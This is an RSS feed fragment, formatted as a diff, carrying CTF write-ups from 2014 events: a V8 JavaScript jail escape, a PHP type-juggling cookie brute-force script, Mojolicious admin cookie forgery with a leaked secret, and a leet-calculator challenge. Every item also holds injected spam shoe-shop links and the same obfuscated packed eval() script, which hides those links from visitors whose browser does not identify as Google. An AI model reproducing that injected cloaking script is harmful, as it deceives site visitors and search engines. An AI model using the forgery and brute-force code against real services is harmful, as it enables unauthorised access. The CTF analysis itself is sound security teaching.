+ <guid isPermaLink="false">99 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/99#comments</comments>
+</item>
+<item>
+ <title>JavaScript jail</title>
+ <link>https://ctfcrew.org/writeup/62</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;We have an ip address and a port. Connected using netcat we got V8 JavaScript shell. &lt;em&gt;print(Object.keys(this)) &lt;/em&gt;gives us all global objects available: print, quit, checker, check.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;print(check) &lt;/em&gt;gives our pwn target:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;function (rand) {
+	function stage1() {
+		var a = Array.apply(null, new Array(Math.floor(Math.random() * 20) + 10)).map(function () {return Math.random() * 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	function stage2() {
+		var a = Array.apply(null, new Array((myRand() % 20) + 10)).map(function () {return myRand() % 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	print(&quot;stage1&quot;);
+
+	if (!stage1())
+		return;
+
+	print(&quot;stage2&quot;);
+
+	if (!stage2())
+		return;
+
+	print(&quot;awesome!&quot;);
+	return flag;
+}&lt;/pre&gt;&lt;p&gt;The flag is contained in closure made by calling &lt;em&gt;checker&lt;/em&gt;. Since there is no any legal method to take variables from closure we have to deceive &lt;em&gt;check&lt;/em&gt; tests somehow. It&#039;s JavaScript baby, we can redefine everything. The simplest solution is to redefine &lt;em&gt;Array.apply&lt;/em&gt; in a way it returns empty array and to return empty array from our &lt;em&gt;rand&lt;/em&gt; function. Obviously two empty arrays are the same size and have same elements. Let&#039;s do it:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Array.apply = function() {return [];};
+function rand() {return [];}
+check(rand);&lt;/pre&gt;&lt;p&gt;This is it.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sportswear free shipping&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeaggeshop/p/nike-air-force-1-07-essential-blanche-et-or-femme-172723.html&quot;&gt;Nike Air Force 1&#039;07 Essential blanche et or femme - Chaussures Baskets femme - Gov&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 02 Jun 2014 09:14:59 +0000</pubDate>
+ <dc:creator>villytiger</dc:creator>
+ <guid isPermaLink="false">62 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/62#comments</comments>
+</item>
+<item>
+ <title>Web 200</title>
+ <link>https://ctfcrew.org/writeup/61</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;The sense of this task is to login with user which idx=1. But we don&#039;t know, who has this idx&lt;/p&gt;
+&lt;p&gt;The algoritm for cookie is CRCR32 and this is strange. Because this hash purpose is not for crypto, it&#039;s for checksums. But for first try code of server look&#039;s good enough. &lt;strong&gt;REALY THANK TO ORGS, BECAUSE CODE IS GREAT AND SIMPLE, SO IT&#039;S REALY EASY TO UNDERSTAND THE LOGIC OF SERVER&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;After reading some manuals we decided that the vuln is in hash. And found &lt;a href=&quot;https://www.alertlogic.com/writing-exploits-for-exotic-bug-classes-php-type-juggling/&quot;&gt;post about comparison issues&lt;/a&gt; in php whith float string&lt;/p&gt;
+&lt;p&gt;Php is not strongly typed, and that&#039;s why there is some magic with comprassions, and one of them is casting both string to float if they look like float. For example:&lt;/p&gt;
+&lt;pre class=&quot;brush: php; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+	if (&quot;0e12&quot; == &quot;0&quot;)
+		echo 1;
+	else
+		echo 2;
+&lt;/pre&gt;
+&lt;p&gt;This code prints 1!!!! This is magic two different string are equal))&lt;/p&gt;
+&lt;p&gt;So we decided to brute cookie. We were always sending hash = &quot;0&quot; and different timestamp&lt;/p&gt;
+&lt;p&gt;Some calculation, we need first symbol to be &quot;0&quot;, second &quot;e&quot;, and all other is digits. So the probability is 1/16 * 1/16 * (10/16)**6. this is equal to 1/4300, that is not much for online brute&lt;/p&gt;
+&lt;p&gt;First part was done, we could logged-in with id we want. But what id we need?&lt;/p&gt;
+&lt;p&gt;After reading code we found this strange&lt;/p&gt;
+&lt;pre class=&quot;brush: php; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;public function islogin(){
+			if( preg_match(&quot;/[^0-9A-Za-z]/&quot;, $_COOKIE[&#039;user_name&#039;]) ){
+	 			exit(&quot;cannot be used Special character&quot;);
+			}
+
+			if( $_COOKIE[&#039;user_name&#039;] == &quot;admin&quot; )	return 0;
+
+			$salt = file_get_contents(&quot;../../long_salt.txt&quot;);
+
+			if( hash(&#039;crc32&#039;,$salt.&#039;|&#039;.(int)$_COOKIE[&#039;login_time&#039;].&#039;|&#039;.$_COOKIE[&#039;user_name&#039;]) == $_COOKIE[&#039;hash&#039;] ){
+				return 1;
+			}
+
+			return 0;
+		}
+&lt;/pre&gt;
+&lt;p&gt;The 6th string seems to be strange, why id admin is restricred. This is easy to bypass. We just need to login with name in uppercase, because php use case sensetive cmp, but sql not.&lt;/p&gt;
+&lt;p&gt;So the brute scipt is:&lt;/p&gt;
+&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import requests
+
+u1 = &quot;http://219.240.37.153:5959/63972dfdacc8a838f618275d80d27c1d_h/index.php&quot;
+for i in xrange(0, 10000000):
+    print i
+    cookies = {
+        &quot;login_time&quot;: str(i),
+        &quot;user_name&quot;: &quot;ADMIN&quot;,
+        &quot;hash&quot;: &quot;0&quot;
+    }
+    try:
+        r = requests.get(u1, cookies=cookies).content
+    except:
+        continue
+    if &#039;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;id&quot; id=&quot;inputID&quot; placeholder=&quot;ID&quot;&gt;&#039; not in r:
+        print r
+        exit(0)
+
+&lt;/pre&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;buy footwear&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-jordan-1/&quot;&gt;Women&#039;s Nike Air Jordan 1 trainers - Latest Releases , Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 01 Jun 2014 20:05:07 +0000</pubDate>
+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">61 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/61#comments</comments>
+</item>
+<item>
+ <title>es (web 200)</title>
+ <link>https://ctfcrew.org/writeup/48</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/17&quot;&gt;RuCTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;There is service raised at&amp;nbsp;&lt;a href=&quot;http://w2.quals.ructf.org/&quot;&gt;http://w2.quals.ructf.org/&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;There is&amp;nbsp;the authorization form and another form with strange functional&amp;nbsp;on page. Also there is registration link.&lt;/p&gt;&lt;p&gt;At first we registered a new user with 1 / 1 as login / password. We saw that server set cookie:&lt;/p&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Cookie: mojolicious=eyJuYW1lIjoiMSIsImV4cGlyZXMiOjEzOTUwNjI3OTh9--b844d3ef12af172ffebe4271f93d0548b92f637d
+&lt;/pre&gt;&lt;p&gt;First part before &quot;--&quot; is base64-encoded user session information:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;&#039;eyJuYW1lIjoiMSIsImV4cGlyZXMiOjEzOTUwNjI3OTh9&#039; ==&amp;nbsp;base64(&#039;{&quot;name&quot;:&quot;1&quot;,&quot;expires&quot;:1395062798}&#039;)&lt;/pre&gt;&lt;p&gt;Second part after &quot;--&quot; is hash_hmac with sha1 of first part with a secret. We found secret in page source code:&lt;/p&gt;&lt;pre class=&quot;brush: xml; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;&amp;lt;!-- secret: ructf --&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;span data-rz-clipboard=&quot;true&quot;&gt;So we assumed that we need got admin&#039;s cookie. We replaced our nickname to &#039;admin&#039; and generated new cookie with help of &lt;a href=&quot;http://www.freeformatter.com/hmac-generator.html&quot;&gt;http://www.freeformatter.com/hmac-generator.html&lt;/a&gt;:&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;part1 = base64(&#039;{&quot;name&quot;:&quot;admin&quot;,&quot;expires&quot;:1395062798}&#039;)
+part2 = hash_hmac(&#039;sha1&#039;, part1, &#039;ructf&#039;)&lt;/pre&gt;&lt;p&gt;Result:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;part1 + &#039;--&#039; + part2 ==
+&#039;eyJuYW1lIjoiYWRtaW4iLCJleHBpcmVzIjoxMzk1MDYyNzk4fQ==--f0b9d2795f0e8de1abafede4ea2aae54282e09a9&#039;&lt;/pre&gt;&lt;p&gt;So we logged in with new admin cookie and saw a message &#039;Hi, admin!&#039;. Then we went to &lt;a href=&quot;http://w2.quals.ructf.org/list&quot;&gt;http://w2.quals.ructf.org/list&lt;/a&gt;&amp;nbsp;and got flag&amp;nbsp;&lt;strong&gt;054ad7a734437d6853383ad919526dc5&lt;/strong&gt; by following &lt;a href=&quot;http://w2.quals.ructf.org/very/super/secret/flag&quot;&gt;http://w2.quals.ructf.org/very/super/secret/flag&lt;/a&gt; link.&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: #ffffff; font-family: &#039;Helvetica Neue&#039;, Helvetica, Arial, sans-serif; font-size: 14px;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Asics footwear&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.fitforhealth.eu/cdaushop/product-category/air-jordan-sneakers/&quot;&gt;Air Jordan Sneakers&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 17 Mar 2014 12:49:02 +0000</pubDate>
+ <dc:creator>azrael</dc:creator>
+ <guid isPermaLink="false">48 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/48#comments</comments>
+</item>
+<item>
+ <title>Challenge 1: Guerilla</title>
+ <link>https://ctfcrew.org/writeup/15</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/ppc&quot;&gt;ppc&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/11&quot;&gt;Teaser Insomnihack 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;First we see the text on the page: &lt;strong&gt;&quot;You must specify a nick&quot;.&amp;nbsp;&lt;/strong&gt;After quick look into source code of the page we understand that our URL must contain GET-parameter &#039;nick&#039; with random value.&lt;/p&gt;&lt;p&gt;Then&amp;nbsp;server sends us some leet-modified string like&amp;nbsp;&lt;/p&gt;&lt;pre class=&quot;brush: bash&quot;&gt;51xty tw0 plu5 0n3
+&lt;/pre&gt;&lt;p&gt;and expecting from us solution of this expression in the same format.&lt;/p&gt;&lt;p&gt;Experimentally found that there is only 4 leet-modified characters: &#039;1&#039; == &#039;i&#039;, &#039;3&#039; == &#039;e&#039;, &#039;5&#039; == &#039;s&#039;, &#039;0&#039; == &#039;o&#039;.&lt;/p&gt;&lt;p&gt;There are can be various numbers and all 4 operations: plus, minus, times and divide by. So our solution has following steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;unleetify string to normal words (ex. &quot;sixty two plus one&quot;);&lt;/li&gt;&lt;li&gt;extract operation (&quot;plus&quot; -&amp;gt; &quot;+&quot;);&lt;/li&gt;&lt;li&gt;turn 2 strings to numbers (62 and 1);&lt;/li&gt;&lt;li&gt;eval expression (62 + 1 = 63);&lt;/li&gt;&lt;li&gt;turn number to words (&quot;sixty three&quot;);&lt;/li&gt;&lt;li&gt;leetify this string using same rules as server (&quot;51xty thr33&quot;);&lt;/li&gt;&lt;li&gt;send string to server and get response. If there is no flag in response go to step 1.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;After some number of iterations server will send us a flag:&amp;nbsp;&lt;strong&gt;Fl4g4Th3W1nl33tP0w4h.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;P.S. Because of script use WebSockets we had to write code on JavaScript.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.copperbridgemedia.com/&quot;&gt;Running sports&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.fitforhealth.eu/cdavshop/2021/shop/sneakers-deals/vans-uv-ink-era-change-color-in-the-sun-1203127337/&quot;&gt;Vans Shoes That Change Color in the Sun: UV Era Ink Stacked &amp; More – Fitforhealth News&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/1337-calc.html.zip&quot; type=&quot;application/zip; length=2459&quot;&gt;1337-calc.html.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 03 Feb 2014 22:13:54 +0000</pubDate>
+ <dc:creator>azrael</dc:creator>
+ <guid isPermaLink="false">15 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/15#comments</comments>
+</item>
+</channel>
+</rss>
